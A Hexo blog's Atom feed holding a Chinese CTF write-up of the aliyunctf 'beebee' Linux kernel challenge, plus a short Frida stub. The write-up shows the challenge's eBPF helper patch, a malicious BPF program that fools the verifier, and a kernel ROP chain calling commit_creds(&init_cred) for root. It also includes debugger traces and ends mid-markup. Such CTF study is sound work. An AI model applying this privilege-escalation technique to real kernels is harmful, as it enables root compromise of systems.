<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://zjw1nd.github.io/atom.xml" rel="self"/>
  
  <link href="https://zjw1nd.github.io/"/>
  <updated>2025-08-07T08:45:55.257Z</updated>
  <id>https://zjw1nd.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Ret2HarmonyOS: Frida环境搭建和入门</title>
    <link href="https://zjw1nd.github.io/2025/08/07/Ret2HarmonyOS-Frida%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E5%85%A5%E9%97%A8/"/>
    <id>https://zjw1nd.github.io/2025/08/07/Ret2HarmonyOS-Frida%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E5%85%A5%E9%97%A8/</id>
    <published>2025-08-07T04:00:40.000Z</published>
    <updated>2025-08-07T08:45:55.257Z</updated>
    
    <content type="html"><![CDATA[<h1>Frida</h1><p>frida都是针对安卓的，使用内部自己编译的server</p><ol><li class="lvl-3">代码签名</li><li class="lvl-3">auxv-not-found</li><li class="lvl-3"></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Frida&lt;/h1&gt;
&lt;p&gt;frida都是针对安卓的，使用内部自己编译的server&lt;/p&gt;
&lt;ol&gt;
&lt;li class=&quot;lvl-3&quot;&gt;代码签名&lt;/li&gt;
&lt;li class=&quot;lvl-3&quot;&gt;auxv-not-found&lt;/li&gt;
&lt;li class=&quot;lvl-3&quot;&gt;</summary>
      
    
    
    
    <category term="Android" scheme="https://zjw1nd.github.io/categories/Android/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="Android" scheme="https://zjw1nd.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>aliyunctf-beebee复现</title>
    <link href="https://zjw1nd.github.io/2025/06/08/aliyunctf-beebee%E5%A4%8D%E7%8E%B0/"/>
    <id>https://zjw1nd.github.io/2025/06/08/aliyunctf-beebee%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-06-08T07:44:13.000Z</published>
    <updated>2025-07-22T08:40:22.446Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://bbs.kanxue.com/thread-285786.htm">https://bbs.kanxue.com/thread-285786.htm</a></p></blockquote><h1>题目内容</h1><p>题目该给的都给了：一个内核，一个config，一个文件系统，一个启动脚本，还有一个告诉我们如何自己手动配置环境（估计是自己build可以调试）的readme。<br><img src="images/aliyunctf-beebee%E5%A4%8D%E7%8E%B0.md/image.png" alt="alt text"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## How to build your own kernel</span></span><br><span class="line">wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.6.74.tar.xz</span><br><span class="line">tar -xJf linux-6.6.74.tar.xz</span><br><span class="line"><span class="built_in">cp</span> beebee_Kconfig linux-6.6.74/.config</span><br><span class="line"><span class="built_in">cd</span> linux-6.6.74</span><br><span class="line">patch -p1 &lt; ../aliyunctf.patch</span><br><span class="line">make bzImage -j`<span class="built_in">nproc</span>`</span><br></pre></td></tr></table></figure><p>这道题并没有什么内核模块，题目的本质就是一个<a href="#patch">patch</a>.这个patch对linux内核的一些核心功能做了一点修改。启动参数：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64  \</span><br><span class="line">-m 512M  \</span><br><span class="line">-smp 2 \</span><br><span class="line">-kernel bzImage    \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 quiet panic=-1 nokaslr sysctl.kernel.io_uring_disabled=1 sysctl.kernel.dmesg_restrict=1 sysctl.kernel.kptr_restrict=2 sysctl.kernel.unprivileged_bpf_disabled=0&quot;</span>     \</span><br><span class="line">-initrd rootfs.cpio \</span><br><span class="line">-drive file=./flag,<span class="keyword">if</span>=virtio,format=raw,<span class="built_in">readonly</span>=on \</span><br><span class="line">-nographic  \</span><br><span class="line">-net nic,model=e1000 \</span><br><span class="line">-no-reboot \</span><br><span class="line">-monitor /dev/null</span><br></pre></td></tr></table></figure><p>可以看到，开了kptr，当时咨询了内核大手子，根据config来看基本绕过这个bpf直接提权是不现实了。另外关闭了kaslr，我们的利用路径变得简单了一点，在没有泄露原语的情况下直接rop应该就可以。</p><h2 id="aliyunctf-patch-a-id-patch-a">aliyunctf.patch <a id="patch"></a></h2><p>patch的内容放在这里：</p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">diff --color -ruN origin/include/linux/bpf.h aliyunctf/include/linux/bpf.h</span><br><span class="line"><span class="comment">--- origin/include/linux/bpf.h2025-01-23 10:21:19.000000000 -0600</span></span><br><span class="line"><span class="comment">+++ aliyunctf/include/linux/bpf.h2025-01-24 03:44:01.494468038 -0600</span></span><br><span class="line"><span class="meta">@@ -3058,6 +3058,7 @@</span></span><br><span class="line"> extern const struct bpf_func_proto bpf_user_ringbuf_drain_proto;</span><br><span class="line"> extern const struct bpf_func_proto bpf_cgrp_storage_get_proto;</span><br><span class="line"> extern const struct bpf_func_proto bpf_cgrp_storage_delete_proto;</span><br><span class="line"><span class="addition">+extern const struct bpf_func_proto bpf_aliyunctf_xor_proto;</span></span><br><span class="line"> </span><br><span class="line"> const struct bpf_func_proto *tracing_prog_func_proto(</span><br><span class="line">   enum bpf_func_id func_id, const struct bpf_prog *prog);</span><br><span class="line">diff --color -ruN origin/include/uapi/linux/bpf.h aliyunctf/include/uapi/linux/bpf.h</span><br><span class="line"><span class="comment">--- origin/include/uapi/linux/bpf.h2025-01-23 10:21:19.000000000 -0600</span></span><br><span class="line"><span class="comment">+++ aliyunctf/include/uapi/linux/bpf.h2025-01-24 03:44:11.814636836 -0600</span></span><br><span class="line"><span class="meta">@@ -5881,6 +5881,7 @@</span></span><br><span class="line"> FN(user_ringbuf_drain, 209, ##ctx)\</span><br><span class="line"> FN(cgrp_storage_get, 210, ##ctx)\</span><br><span class="line"> FN(cgrp_storage_delete, 211, ##ctx)\</span><br><span class="line"><span class="addition">+FN(aliyunctf_xor, 212, ##ctx)\</span></span><br><span class="line"> /* */</span><br><span class="line"> </span><br><span class="line"> /* backwards-compatibility macros for users of __BPF_FUNC_MAPPER that don&#x27;t</span><br><span class="line">diff --color -ruN origin/kernel/bpf/helpers.c aliyunctf/kernel/bpf/helpers.c</span><br><span class="line"><span class="comment">--- origin/kernel/bpf/helpers.c2025-01-23 10:21:19.000000000 -0600</span></span><br><span class="line"><span class="comment">+++ aliyunctf/kernel/bpf/helpers.c2025-01-24 03:44:06.683490095 -0600</span></span><br><span class="line"><span class="meta">@@ -1745,6 +1745,28 @@</span></span><br><span class="line"> .arg3_type= ARG_CONST_ALLOC_SIZE_OR_ZERO,</span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+BPF_CALL_3(bpf_aliyunctf_xor, const char *, buf, size_t, buf_len, s64 *, res) &#123;</span></span><br><span class="line"><span class="addition">+s64 _res = 2025;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+if (buf_len != sizeof(s64))</span></span><br><span class="line"><span class="addition">+return -EINVAL;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+_res ^= *(s64 *)buf;</span></span><br><span class="line"><span class="addition">+*res = _res;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+return 0;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+const struct bpf_func_proto bpf_aliyunctf_xor_proto = &#123;</span></span><br><span class="line"><span class="addition">+.func= bpf_aliyunctf_xor,</span></span><br><span class="line"><span class="addition">+.gpl_only= false,</span></span><br><span class="line"><span class="addition">+.ret_type= RET_INTEGER,</span></span><br><span class="line"><span class="addition">+.arg1_type= ARG_PTR_TO_MEM | MEM_RDONLY,</span></span><br><span class="line"><span class="addition">+.arg2_type= ARG_CONST_SIZE,</span></span><br><span class="line"><span class="addition">+.arg3_type= ARG_PTR_TO_FIXED_SIZE_MEM | MEM_UNINIT | MEM_ALIGNED | MEM_RDONLY,</span></span><br><span class="line"><span class="addition">+.arg3_size= sizeof(s64),</span></span><br><span class="line"><span class="addition">+&#125;;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> const struct bpf_func_proto bpf_get_current_task_proto __weak;</span><br><span class="line"> const struct bpf_func_proto bpf_get_current_task_btf_proto __weak;</span><br><span class="line"> const struct bpf_func_proto bpf_probe_read_user_proto __weak;</span><br><span class="line"><span class="meta">@@ -1801,6 +1823,8 @@</span></span><br><span class="line"> return &amp;bpf_strtol_proto;</span><br><span class="line"> case BPF_FUNC_strtoul:</span><br><span class="line"> return &amp;bpf_strtoul_proto;</span><br><span class="line"><span class="addition">+case BPF_FUNC_aliyunctf_xor:</span></span><br><span class="line"><span class="addition">+return &amp;bpf_aliyunctf_xor_proto;</span></span><br><span class="line"> default:</span><br><span class="line"> break;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>能看到它注册了一些新的结构体和函数，并且似乎提供了一次内核空间写入的机会。那我们怎么用呢？下面就得看下ebpf是什么了。</p><h1>ebpf是什么？</h1><blockquote><p><a href="https://ebpf.io/what-is-ebpf/">https://ebpf.io/what-is-ebpf/</a></p></blockquote><p>ebpf，全称extended Berkeley Packet Filter，是从bpf进化而来的，一个在linux内核中运行的“虚拟机”，它能访问内核功能和内存的子集，在所有的发行版中都默认开启。</p><h2 id="原理？">原理？</h2><p>这个东西比较独特，有些类似java（对没有学过java的本人来说第一次见理解确实有难度）。整个bpf虚拟机有自己的指令集，用户态用编译器将自己编写的C程序编译成<code>.bpf</code>字节码程序，然后这个东西会用bpf调用加载入内核，经过一次安全check之后(kernel/bpf/verifier.c)，用jit编译成真正的可执行机器码，并且hook到一些内核的运行路径上。这些代码的数据会写入ringbuffers或者ebpf单独管理的kv maps，用户空间从中读取结果。<br><img src="images/aliyunctf-beebee%E5%A4%8D%E7%8E%B0.md/image-1.png" alt="ebpf"></p><h2 id="辅助函数-漏洞的本质">辅助函数-漏洞的本质</h2><p>ebpf提供了一套可以扩展功能的模式，通过<code>struct bpf_func_proto</code>描述定义。</p><p>这些辅助函数的逻辑是由编写者自定义的，这些辅助函数的C代码可以在ebpf中去调用————不出意外的话就要出意外了。首先，所有的检查都是针对bpf字节码的，对于内存的权限控制是由虚拟机管理而非操作系统，那么就产生了这道题。通过辅助函数的恶意操作写入一些ebpf中原本认为只读的区域（C代码写，不会被check），在完成后ebpf就不会对原先只读的区域再check，造成UAF或更大的危险。换言之，<font color=red>bpf的检查器跟踪不到辅助函数的内部逻辑，只会根据我们告诉它的proto在bpf程序真正执行前做check</font>。<strong>这道题用一个evil patch欺骗了bpf的verifier，就达到了攻击的目的。</strong></p><h1>利用过程</h1><p>在patch中定义了一个辅助函数<code>aliyunctf_xor</code>，接收三个参数，一个buf，buf_len还有一个64位的指针res。函数内会将传入的buffer内的8字节和2025做异或，然后写入第三参数的位置。乍一看似乎是一个8字节的任意地址写，但是在proto中，arg3被声明为了只读。</p><h2 id="漏洞利用：ebpf指令编写">漏洞利用：ebpf指令编写</h2><p>ebpf的汇编字节码是基于risc指令集的。linux的example里有一个用宏打包好的，可读性强一点的能让我们在C中编写ebpf汇编的<a href="https://github.com/torvalds/linux/blob/master/samples/bpf/bpf_insn.h">头文件</a>.</p><p>r0返回值，r1-5传参，r6-9通用，r10只读堆栈寄存器。8bit的操作码（5-3 末尾3bit表示指令类型，访存/运算/跳转，高5位表示一个类型下面的不同的具体指令，划分方法也不同），关于指令格式和操作方法的内容，可以参考<a href="https://zhuanlan.zhihu.com/p/487995137">这里</a></p><p>这些内容被送到内核后会被编译成可以实际运行的本机架构指令放在一个内核地址空间中。</p><h2 id="官方wp做了什么？">官方wp做了什么？</h2><p>我们倒着看，最后是一个简单的ROP。先看最后的ROP做了什么：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Prepare data for ROP chain</span></span><br><span class="line"><span class="type">char</span> data_buf[<span class="number">4096</span>] = &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">sk_buff</span> <span class="title">md</span> =</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> *rop_chain = (<span class="type">size_t</span> *)&amp;data_buf[<span class="number">30</span>];</span><br><span class="line">*rop_chain++ = <span class="number">0xffffffff8130d3de</span>; <span class="comment">//  pop rdi; ret;</span></span><br><span class="line">*rop_chain++ = <span class="number">0xffffffff82a52fa0</span>; <span class="comment">//  &amp;init_cred</span></span><br><span class="line">*rop_chain++ = <span class="number">0xffffffff810c3c50</span>; <span class="comment">//  commit_creds</span></span><br><span class="line">*rop_chain++ = <span class="number">0xffffffff8108e620</span>; <span class="comment">//  vfork</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Run prog</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">test_run_attr</span> =</span> &#123;</span><br><span class="line">    .test.data_size_in = <span class="number">1024</span>,</span><br><span class="line">    .test.data_in = (<span class="type">uint64_t</span>)&amp;data_buf,</span><br><span class="line">    .test.ctx_size_in = <span class="keyword">sizeof</span>(md),</span><br><span class="line">    .test.ctx_in = (<span class="type">uint64_t</span>)&amp;md,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">test_run_attr.prog_type = BPF_PROG_TEST_RUN;</span><br><span class="line">test_run_attr.test.prog_fd = prog_fd;</span><br><span class="line"><span class="type">int</span> ret = SYSCHK(syscall(SYS_bpf, BPF_PROG_TEST_RUN, &amp;test_run_attr,</span><br><span class="line">                         <span class="keyword">sizeof</span>(test_run_attr)));</span><br><span class="line"></span><br><span class="line">close(prog_fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get flag</span></span><br><span class="line"><span class="keyword">if</span> (!getuid())</span><br><span class="line">  system(<span class="string">&quot;cat /flag &amp;&amp; whoami &amp;&amp; id&quot;</span>);</span><br></pre></td></tr></table></figure><p>最后只是用了syscall(bpf)，加载了一段内容，标记为了PROG_TEST_RUN，这个标记是允许不hook任何执行流来执行bpf代码，这里将attr.test.prog_fd配置成了上文中自己写的一段bpf代码，将attr.test.data_in配置成了在30偏移处含有rop链的一个buffer。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap-explore 0xffffffffc00006af</span><br><span class="line">             Start                End Perm     Size Offset File (<span class="built_in">set</span> vmmap-prefer-relpaths on)</span><br><span class="line">0xffffffffc0000000 0xffffffffc0200000 rwxp   200000      0 &lt;explored_ffffffffc0000&gt;</span><br></pre></td></tr></table></figure><p>在bpf_skb_load_bytes断点跟进，在第二个ret，也就是从bpf_skb_load_Bytes出来之后，触发了rop：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0xffffc90000213cd8 —▸ 0xffffffff8130d3de (fifo_open+206) ◂— 0xffffffff8130d3de</span><br><span class="line">01:0008│     0xffffc90000213ce0 —▸ 0xffffffff82a52fa0 (init_cred) ◂— 0xffffffff82a52fa0</span><br><span class="line">02:0010│     0xffffc90000213ce8 —▸ 0xffffffff810c3c50 (commit_creds) ◂— 0xffffffff810c3c50</span><br><span class="line">03:0018│     0xffffc90000213cf0 —▸ 0xffffffff8108e620 (__x64_sys_vfork) ◂— 0xffffffff8108e620</span><br><span class="line">04:0020│     0xffffc90000213cf8 ◂— 0xffffc90000213cf8</span><br><span class="line">... ↓        3 skipped</span><br></pre></td></tr></table></figure><p>那么现在的问题是，这个ret的执行流来自哪里？为什么这里会被写入？</p><p>我们做一个对比程序，把rop链注释掉来观察。首先是ebpf risc汇编代码究竟编译成了什么。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Setup evil bpf prog</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">    <span class="comment">// ? R9 = CTX 一般的起手</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),</span><br><span class="line">    <span class="comment">// ? R3 = ELEM</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-16</span>, <span class="number">0</span>),  <span class="comment">// stack</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),    <span class="comment">// R2 = stack ptr</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-16</span>),  <span class="comment">// R2 = stack ptr - 16</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, array_map_fd),      <span class="comment">// </span></span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),</span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(), <span class="comment">// ? Remove or_null tag</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ? R6 = P1 (scalar)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),</span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_7, <span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ? R1(buf) = ptr to &lt;value&gt;, which will be set at read-only map</span></span><br><span class="line">    BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x18</span>, <span class="number">2025</span> ^ (<span class="number">0x80</span>)), <span class="comment">// ! 256 bytes</span></span><br><span class="line">    BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x14</span>, <span class="number">0</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">-0x18</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ? R2(buf_size) = 8</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">8</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_aliyunctf_xor),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 布局bpf_skb_load_bytes的参数 </span></span><br><span class="line">    <span class="comment">// ? R1 = CTX</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ? R2 = anything</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ? R3 = stack</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ? R4 = size (previously as P1 (scalar), now changed to evil value)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_7, <span class="number">0</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),</span><br><span class="line"></span><br><span class="line">    BPF_EXIT_INSN()&#125;; <span class="comment">// key，这条指令会被JIT编译成</span></span><br></pre></td></tr></table></figure><p>下面是所有的risc代码转成的机器码内容，它显然是存在一些编译优化和代码复用的机制在。但是我们能够看到，转x86_64之后变动不是太大，函数调用基本上也是call地址，这个test程序片段的退出最终也是靠的671处的ret指令。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0xffffffffc0000670:  endbr64</span><br><span class="line">   0xffffffffc0000674:  nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0xffffffffc0000679:  xchg   ax,ax</span><br><span class="line">   0xffffffffc000067b:  push   rbp</span><br><span class="line">   0xffffffffc000067c:  mov    rbp,rsp</span><br><span class="line">   0xffffffffc000067f:  endbr64</span><br><span class="line">   0xffffffffc0000683:  sub    rsp,0x18</span><br><span class="line">   0xffffffffc000068a:  push   rbx</span><br><span class="line">   0xffffffffc000068b:  push   r13</span><br><span class="line">   0xffffffffc000068d:  push   r15</span><br><span class="line">   0xffffffffc000068f:  mov    r15,rdi</span><br><span class="line">   0xffffffffc0000692:  mov    QWORD PTR [rbp-0x10],0x0</span><br><span class="line">   0xffffffffc000069a:  lfence</span><br><span class="line">   0xffffffffc000069d:  mov    rsi,rbp</span><br><span class="line">   0xffffffffc00006a0:  add    rsi,0xfffffffffffffff0</span><br><span class="line">   0xffffffffc00006a4:  movabs rdi,0xffff8880039c2600</span><br><span class="line">   0xffffffffc00006ae:  add    rdi,0x150</span><br><span class="line">   0xffffffffc00006b5:  mov    eax,DWORD PTR [rsi+0x0]</span><br><span class="line">   0xffffffffc00006b8:  cmp    rax,0x1</span><br><span class="line">   0xffffffffc00006bc:  jae    0xffffffffc00006ca</span><br><span class="line">   0xffffffffc00006be:  and    eax,0x0</span><br><span class="line">   0xffffffffc00006c1:  shl    rax,0x3</span><br><span class="line">   0xffffffffc00006c5:  add    rax,rdi</span><br><span class="line">   0xffffffffc00006c8:  jmp    0xffffffffc00006cc</span><br><span class="line">   0xffffffffc00006ca:  xor    eax,eax</span><br><span class="line">   0xffffffffc00006cc:  <span class="built_in">test</span>   rax,rax</span><br><span class="line">   0xffffffffc00006cf:  jne    0xffffffffc00006d8</span><br><span class="line">   0xffffffffc00006d1:  pop    r15</span><br><span class="line">   0xffffffffc00006d3:  pop    r13</span><br><span class="line">   0xffffffffc00006d5:  pop    rbx</span><br><span class="line">   0xffffffffc00006d6:  leave</span><br><span class="line">   0xffffffffc00006d7:  ret</span><br><span class="line">   0xffffffffc00006d8:  mov    rdx,rax</span><br><span class="line">   0xffffffffc00006db:  mov    r13,rax</span><br><span class="line">   0xffffffffc00006de:  mov    rbx,QWORD PTR [r13+0x0]</span><br><span class="line">   0xffffffffc00006e2:  mov    DWORD PTR [rbp-0x18],0x769</span><br><span class="line">   0xffffffffc00006e9:  lfence</span><br><span class="line">   0xffffffffc00006ec:  mov    DWORD PTR [rbp-0x14],0x0</span><br><span class="line">   0xffffffffc00006f3:  lfence</span><br><span class="line">   0xffffffffc00006f6:  mov    rdi,rbp</span><br><span class="line">   0xffffffffc00006f9:  add    rdi,0xffffffffffffffe8</span><br><span class="line">   0xffffffffc00006fd:  mov    esi,0x8</span><br><span class="line">   0xffffffffc0000702:  call   0xffffffff81208350 &lt;bpf_aliyunctf_xor&gt;</span><br><span class="line">   0xffffffffc0000707:  mov    rdi,r15</span><br><span class="line">   0xffffffffc000070a:  xor    esi,esi</span><br><span class="line">   0xffffffffc000070c:  mov    rdx,rbp</span><br><span class="line">   0xffffffffc000070f:  add    rdx,0xfffffffffffffff8</span><br><span class="line">   0xffffffffc0000713:  mov    rcx,QWORD PTR [r13+0x0]</span><br><span class="line">   0xffffffffc0000717:  call   0xffffffff81c138d0 &lt;bpf_skb_load_bytes&gt;</span><br><span class="line">   0xffffffffc000071c:  jmp    0xffffffffc00006d1</span><br></pre></td></tr></table></figure><p>从bpf_test_run+351开始进入我们的程序。我们从bpf_test_run打断点开始跟踪，首先第一个点是这里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">0xffffffff81c513df</span> &lt;bpf_test_run+<span class="number">351</span>&gt;    call   <span class="number">0xffffffff81f49480</span>          &lt;__x86_indirect_thunk_array&gt;</span><br><span class="line">        rdi: <span class="number">0xffff88800487bb00</span> ◂— <span class="number">0</span></span><br><span class="line">        rsi: <span class="number">0xffffc9000004d048</span> ◂— <span class="number">0x19bf</span></span><br><span class="line">        rdx: <span class="number">0</span></span><br><span class="line">        rcx: <span class="number">0x1c</span></span><br><span class="line"> </span><br><span class="line">   <span 